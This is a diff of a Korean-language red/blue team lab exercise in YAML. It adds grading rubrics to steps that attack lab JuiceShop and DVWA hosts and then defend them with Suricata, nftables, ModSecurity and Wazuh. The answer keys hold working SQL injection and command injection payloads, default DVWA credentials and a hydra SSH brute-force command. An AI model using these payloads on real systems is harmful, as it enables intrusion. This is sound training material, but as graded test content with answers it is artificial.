@@ -3,8 +3,8 @@ title: 실전 공방전 3 — 다중 벡터 공격 vs 계층 방어 (라운드 3
 version: non-ai
 course: battle-nonai
 week: 13
-description: 1세트 인프라에서 Red/Blue 역할을 번갈아 수행한다. Red Phase에서 다중 벡터(웹+네트워크+시스템) 동시 공격을
-  수행하고, Blue Phase에서 계층적 방어(nftables+Suricata+ModSecurity+Wazuh)로 대응한다.
+description: 1세트 인프라에서 Red/Blue 역할을 번갈아 수행한다. Red Phase에서 다중 벡터(웹+네트워크+시스템) 동시 공격을 수행하고, Blue Phase에서
+  계층적 방어(nftables+Suricata+ModSecurity+Wazuh)로 대응한다.
 difficulty: medium
 duration_minutes: 120
 objectives:
@@ -25,14 +25,28 @@ steps:
   hint: secu의 Suricata, nftables와 siem의 Wazuh 상태를 확인한다.
   category: defense
   points: 10
-  answer: sudo systemctl status suricata | head -3 && echo '---' && nft list ruleset
-    | grep -c 'rule' && echo ' rules active' && echo '--- Monitoring ready ---'
-  answer_detail: 공방전 시작 시 모든 방어 시스템의 가동을 확인한다. Suricata, nftables, ModSecurity가 모두
-    활성 상태여야 한다.
+  answer: sudo systemctl status suricata | head -3 && echo '---' && nft list ruleset | grep -c 'rule'
+    && echo ' rules active' && echo '--- Monitoring ready ---'
+  answer_detail: 공방전 시작 시 모든 방어 시스템의 가동을 확인한다. Suricata, nftables, ModSecurity가 모두 활성 상태여야 한다.
   verify:
     type: output_contains
     expect: Monitoring ready
     field: stdout
+    semantic:
+      intent: '[BLUE] 방어 시스템 점검 — systemctl status suricata + nft list ruleset | rule 카운트. 공방전 시작 전 Suricata/nftables/ModSecurity
+        가동 확인. 다층 방어 전제.'
+      success_criteria:
+      - Monitoring ready 키워드
+      - suricata status + nft rules 카운트
+      - 다층 방어 확인
+      acceptable_methods:
+      - systemctl + nft list
+      - Wazuh Dashboard
+      - Ansible health check
+      negative_signs:
+      - 단일 시스템
+      - 상태 미확인
+      - 방어 층 맥락 없음
   target_vm: secu
 - order: 2
   instruction: '[RED] 다중 벡터 1: web 서버에 대한 빠른 정찰과 JuiceShop 공격을 동시에 수행하라.'
@@ -41,59 +55,115 @@ steps:
   points: 10
   answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속
 
-    📎 참고 (CLI): nmap -sV -p 80,3000,8080 -T4 --max-retries 1 --host-timeout 15s 10.20.30.80
-    && curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
-    application/json'' -d ''{"email":"'' or 1=1--","password":"x"}'' | head -c 200'
+    📎 참고 (CLI): nmap -sV -p 80,3000,8080 -T4 --max-retries 1 --host-timeout 15s 10.20.30.80 && curl -s
+    -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"''
+    or 1=1--","password":"x"}'' | head -c 200'
   answer_detail: 다중 벡터 공격은 정찰과 공격을 동시에 수행하여 방어팀의 대응 자원을 분산시킨다.
   verify:
     type: output_contains
     expect: open
     field: stdout
+    semantic:
+      intent: '[RED] 다중 벡터 1 — nmap + JuiceShop SQLi 병행. 정찰 + 공격 동시. 방어팀 자원 분산. MITRE ATT&CK 다중 전술.'
+      success_criteria:
+      - open 키워드
+      - nmap + SQLi 병행
+      - 동시 벡터
+      acceptable_methods:
+      - nmap + curl 병행
+      - tmux 병렬
+      - Metasploit 자동화
+      negative_signs:
+      - 단일 벡터
+      - 순차 공격
+      - 분산 맥락 없음
   target_vm: attacker
 - order: 3
   instruction: '[RED] 다중 벡터 2: DVWA에 SQL Injection과 Command Injection을 연속으로 시도하라.'
   hint: DVWA에 로그인 후 여러 공격을 수행한다.
   category: exploit
   points: 10
-  answer: "curl -c /tmp/dvwa_r3.txt \\\n  -d 'username=admin&password=password&Login=Login'\
-    \ http://10.20.30.80:8080/login.php && curl -b /tmp/dvwa_r3.txt \"http://10.20.30.80:8080/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit\"\
-    \ \\\n  -o /dev/null \\\n  -w 'SQLi:%{http_code} ' && curl -b /tmp/dvwa_r3.txt\
-    \ \\\n  -d 'ip=127.0.0.1;whoami&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/\
-    \ \\\n  -o /dev/null \\\n  -w 'CmdInj:%{http_code}' && echo ' Multi-vector attack\
-    \ complete'"
+  answer: "curl -c /tmp/dvwa_r3.txt \\\n  -d 'username=admin&password=password&Login=Login' http://10.20.30.80:8080/login.php\
+    \ && curl -b /tmp/dvwa_r3.txt \"http://10.20.30.80:8080/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit\"\
+    \ \\\n  -o /dev/null \\\n  -w 'SQLi:%{http_code} ' && curl -b /tmp/dvwa_r3.txt \\\n  -d 'ip=127.0.0.1;whoami&Submit=Submit'\
+    \ http://10.20.30.80:8080/vulnerabilities/exec/ \\\n  -o /dev/null \\\n  -w 'CmdInj:%{http_code}'\
+    \ && echo ' Multi-vector attack complete'"
   answer_detail: 여러 공격 벡터를 연속으로 시도하면 방어팀이 모든 공격을 동시에 대응하기 어렵다.
   verify:
     type: output_contains
     expect: Multi-vector attack complete
     field: stdout
+    semantic:
+      intent: '[RED] 다중 벡터 2 — DVWA 로그인 + SQLi + Command Injection 연속. 동시 방어 불가능. 방어 자원 분산. MITRE T1190.'
+      success_criteria:
+      - Multi-vector attack complete 키워드
+      - SQLi + CmdInj 연속
+      - 2종 공격 벡터
+      acceptable_methods:
+      - curl 연속 공격
+      - Metasploit multi-handler
+      - 스크립트 자동화
+      negative_signs:
+      - 공격 1종만
+      - 연속 아님
+      - 다중 맥락 없음
   target_vm: attacker
 - order: 4
   instruction: '[BLUE] Suricata에서 다중 벡터 공격 알림을 분석하고, 공격 유형별로 분류하라.'
   hint: eve.json에서 signature별 집계를 수행한다.
   category: defense
   points: 10
-  answer: cat /var/log/suricata/eve.json | jq -r 'select(.event_type=="alert") | .alert.signature'
-    2>/dev/null | sort | uniq -c | sort -rn | head -10 && echo '=== Alert classification
-    complete ==='
+  answer: cat /var/log/suricata/eve.json | jq -r 'select(.event_type=="alert") | .alert.signature' 2>/dev/null
+    | sort | uniq -c | sort -rn | head -10 && echo '=== Alert classification complete ==='
   answer_detail: 다중 벡터 공격 시 여러 종류의 알림이 동시에 발생한다. 시그니처별 집계로 공격의 전체 그림을 파악한다.
   verify:
     type: output_contains
     expect: Alert classification complete
     field: stdout
+    semantic:
+      intent: '[BLUE] 다중 벡터 분류 — jq .alert.signature eve.json | sort | uniq -c. 시그니처별 집계. 공격 전체 그림 파악.
+        SQLi/Scan/CmdInj 구분. SOC 분석.'
+      success_criteria:
+      - Alert classification complete 키워드
+      - jq signature + 집계
+      - 시그니처 분류
+      acceptable_methods:
+      - jq + uniq -c
+      - Dashboard pie chart
+      - Splunk stats count
+      negative_signs:
+      - 시그니처 미추출
+      - 단순 tail
+      - 분류 맥락 없음
   target_vm: secu
 - order: 5
   instruction: '[BLUE] 공격자 IP를 자동 차단하고, web 서버의 ModSecurity 차단 로그를 확인하라.'
   hint: blocklist에 IP 추가 후 ModSecurity 로그를 확인한다.
   category: defense
   points: 10
-  answer: sudo nft add element inet filter blocklist { 10.20.30.201 } 2>/dev/null
-    && echo 'IP blocked' && sudo tail -20 /var/log/apache2/modsec_audit.log 2>/dev/null
-    | grep -c 'id' && echo ' ModSecurity events found'
+  answer: sudo nft add element inet filter blocklist { 10.20.30.201 } 2>/dev/null && echo 'IP blocked'
+    && sudo tail -20 /var/log/apache2/modsec_audit.log 2>/dev/null | grep -c 'id' && echo ' ModSecurity
+    events found'
   answer_detail: nftables(네트워크 레벨)와 ModSecurity(애플리케이션 레벨)의 이중 방어가 동작하는지 확인한다.
   verify:
     type: output_contains
     expect: IP blocked
     field: stdout
+    semantic:
+      intent: '[BLUE] 이중 방어 확인 — nft add element blocklist + ModSecurity audit 확인. 네트워크(nftables) + 애플리케이션(ModSecurity)
+        레벨. Defense in Depth. CWE-20 다층.'
+      success_criteria:
+      - IP blocked 키워드
+      - blocklist + ModSecurity audit
+      - 이중 방어
+      acceptable_methods:
+      - nft + modsec_audit
+      - Wazuh + Suricata + WAF
+      - SOAR 통합
+      negative_signs:
+      - 단일 레이어
+      - ModSecurity 미확인
+      - 다층 맥락 없음
   target_vm: secu
   requires_approval: true
 - order: 6
@@ -101,13 +171,28 @@ steps:
   hint: hydra로 SSH 공격을 수행한다.
   category: exploit
   points: 10
-  answer: hydra -l ccc -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://10.20.30.80
-    -t 2 -f -w 5 2>&1 | tail -5 || echo 'SSH brute force attempt complete'
+  answer: hydra -l ccc -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://10.20.30.80 -t 2 -f
+    -w 5 2>&1 | tail -5 || echo 'SSH brute force attempt complete'
   answer_detail: IP가 차단된 상태에서는 SSH 접근도 불가능하다. 방화벽이 모든 프로토콜을 차단하는지 확인한다.
   verify:
     type: output_contains
     expect: complete
     field: stdout
+    semantic:
+      intent: '[RED] SSH 브루트 — hydra -l ccc -P unix_passwords.txt ssh://10.20.30.80 -t 2 -f -w 5. IP 차단
+        시 모든 프로토콜 실패. 방화벽 완전 차단 검증. MITRE T1110.'
+      success_criteria:
+      - complete 키워드
+      - hydra ssh
+      - 차단 상태 확인
+      acceptable_methods:
+      - hydra ssh
+      - medusa
+      - nc 연결 시도
+      negative_signs:
+      - ssh 없음
+      - 단일 시도
+      - 차단 맥락 없음
   target_vm: attacker
 - order: 7
   instruction: '[BLUE] 차단 해제 후 Wazuh SIEM에서 종합 위협 분석을 수행하라.'
@@ -116,16 +201,29 @@ steps:
   points: 10
   answer: '🖥️ UI: Wazuh Dashboard(https://SIEM_IP:443) 접속 → 해당 메뉴 확인
 
-    📎 참고 (CLI): sudo nft delete element inet filter blocklist { 10.20.30.201 } 2>/dev/null
-    && echo ''Block removed'' && sudo cat /var/ossec/logs/alerts/alerts.json 2>/dev/null
-    | tail -20 | jq -r ''.rule.description'' 2>/dev/null | sort | uniq -c | sort -rn
-    | head -10 || echo ''Wazuh analysis complete'''
-  answer_detail: Wazuh SIEM은 모든 호스트의 이벤트를 중앙에서 수집한다. 공격 유형별 분류와 심각도 분석으로 전체 위협 상황을
-    파악한다.
+    📎 참고 (CLI): sudo nft delete element inet filter blocklist { 10.20.30.201 } 2>/dev/null && echo ''Block
+    removed'' && sudo cat /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -20 | jq -r ''.rule.description''
+    2>/dev/null | sort | uniq -c | sort -rn | head -10 || echo ''Wazuh analysis complete'''
+  answer_detail: Wazuh SIEM은 모든 호스트의 이벤트를 중앙에서 수집한다. 공격 유형별 분류와 심각도 분석으로 전체 위협 상황을 파악한다.
   verify:
     type: output_contains
     expect: complete
     field: stdout
+    semantic:
+      intent: '[BLUE] 차단 해제 + Wazuh 분석 — nft delete element + jq .rule.description alerts.json | uniq
+        -c. 공격 유형별 분류 + 심각도. 중앙 SIEM. 전체 위협 상황. SOC 통합.'
+      success_criteria:
+      - complete 키워드
+      - nft delete + Wazuh jq 분석
+      - rule.description 집계
+      acceptable_methods:
+      - jq + 집계
+      - Dashboard analysis
+      - Wazuh API stats
+      negative_signs:
+      - Wazuh 미분석
+      - 단순 cat
+      - SIEM 통합 맥락 없음
   target_vm: siem
   requires_approval: true
 - order: 8
@@ -135,32 +233,60 @@ steps:
   points: 10
   answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속
 
-    📎 참고 (CLI): curl -s http://10.20.30.80:3000/api/Products | jq ''.[0:3]'' 2>/dev/null
-    && echo ''\n=== JuiceShop API enumeration complete ==='''
-  answer_detail: JuiceShop의 REST API를 열거하면 사용자, 상품, 주문 등의 데이터에 접근할 수 있다. API 인증 우회와
-    IDOR(Insecure Direct Object Reference)를 시도한다.
+    📎 참고 (CLI): curl -s http://10.20.30.80:3000/api/Products | jq ''.[0:3]'' 2>/dev/null && echo ''\n===
+    JuiceShop API enumeration complete ==='''
+  answer_detail: JuiceShop의 REST API를 열거하면 사용자, 상품, 주문 등의 데이터에 접근할 수 있다. API 인증 우회와 IDOR(Insecure Direct
+    Object Reference)를 시도한다.
   verify:
     type: output_contains
     expect: JuiceShop API enumeration complete
     field: stdout
+    semantic:
+      intent: '[RED] JuiceShop API 열거 — curl /api/Products | jq. REST 엔드포인트 탐색. 데이터 접근. IDOR/인증 우회 시도.
+        MITRE T1213.'
+      success_criteria:
+      - JuiceShop API enumeration complete 키워드
+      - curl /api/Products
+      - jq 파싱
+      acceptable_methods:
+      - curl + jq
+      - Burp Spider
+      - kiterunner API scan
+      negative_signs:
+      - API 없음
+      - 파싱 없음
+      - IDOR 맥락 없음
   target_vm: attacker
 - order: 9
   instruction: '[BLUE] 서비스 가용성 최종 확인과 파일 무결성 검증을 수행하라.'
   hint: 서비스 상태와 파일 해시를 확인한다.
   category: defense
   points: 10
-  answer: "\U0001F5A5️ UI: 브라우저에서 http://WEB_IP:3000 접속\n\U0001F4CE 참고 (CLI): curl\
-    \ -so /dev/null \\\n  -w 'Apache:%{http_code} ' http://10.20.30.80/ && curl -so\
-    \ /dev/null \\\n  -w 'JuiceShop:%{http_code} ' http://10.20.30.80:3000/ && curl\
-    \ -so /dev/null \\\n  -w 'DVWA:%{http_code}' http://10.20.30.80:8080/ && echo\
-    \ '\\nServices OK' && bash /tmp/integrity_monitor.sh 2>/dev/null || echo 'Integrity\
-    \ check done'"
-  answer_detail: 공방전 종료 시 서비스 가용성과 파일 무결성을 모두 확인한다. 서비스가 유지되고 파일이 변조되지 않았으면 Blue Phase
-    성공이다.
+  answer: "\U0001F5A5️ UI: 브라우저에서 http://WEB_IP:3000 접속\n\U0001F4CE 참고 (CLI): curl -so /dev/null \\\n\
+    \  -w 'Apache:%{http_code} ' http://10.20.30.80/ && curl -so /dev/null \\\n  -w 'JuiceShop:%{http_code}\
+    \ ' http://10.20.30.80:3000/ && curl -so /dev/null \\\n  -w 'DVWA:%{http_code}' http://10.20.30.80:8080/\
+    \ && echo '\\nServices OK' && bash /tmp/integrity_monitor.sh 2>/dev/null || echo 'Integrity check\
+    \ done'"
+  answer_detail: 공방전 종료 시 서비스 가용성과 파일 무결성을 모두 확인한다. 서비스가 유지되고 파일이 변조되지 않았으면 Blue Phase 성공이다.
   verify:
     type: output_contains
     expect: Services OK
     field: stdout
+    semantic:
+      intent: '[BLUE] 가용성 + 무결성 — curl × 3 서비스 + integrity_monitor.sh. 서비스 200/302 + 파일 변조 없음 = Blue 성공.
+        SLO + FIM. Purple Team 판정 기준.'
+      success_criteria:
+      - Services OK 또는 Integrity check done 키워드
+      - 3 서비스 + FIM 실행
+      - 2종 검증
+      acceptable_methods:
+      - curl + bash 스크립트
+      - Prometheus + AIDE
+      - Wazuh syscheck
+      negative_signs:
+      - 한 가지만 확인
+      - 통합 맥락 없음
+      - 판정 기준 누락
   target_vm: secu
 - order: 10
   instruction: 라운드 3 종합 보고서를 작성하라. 다중 벡터 공격과 계층 방어의 효과를 분석한다.
@@ -216,10 +342,24 @@ steps:
     EOF
 
     cat /tmp/battle_round3_report.txt'
-  answer_detail: 라운드 3 보고서는 각 방어 레이어의 역할과 효과를 분석한다. Defense-in-Depth의 실제 효과를 정량적으로
-    보여준다.
+  answer_detail: 라운드 3 보고서는 각 방어 레이어의 역할과 효과를 분석한다. Defense-in-Depth의 실제 효과를 정량적으로 보여준다.
   verify:
     type: file_exists
     expect: /tmp/battle_round3_report.txt
     field: filesystem
+    semantic:
+      intent: '[Analysis] Round 3 보고서 — echo > /tmp/battle_round3_report.txt: Multi-Vector 공격 결과 + 계층
+        방어 효과. 각 레이어 차단/탐지. Defense in Depth 검증. Purple Team AAR.'
+      success_criteria:
+      - Battle Round 3 Report 키워드
+      - Multi-Vector + 계층 방어
+      - 각 레이어 효과
+      acceptable_methods:
+      - echo > 보고서
+      - Purple Team AAR
+      - MITRE ATT&CK Navigator 업데이트
+      negative_signs:
+      - 레이어 분석 없음
+      - 단측 분석
+      - 다층 맥락 없음
   target_vm: attacker
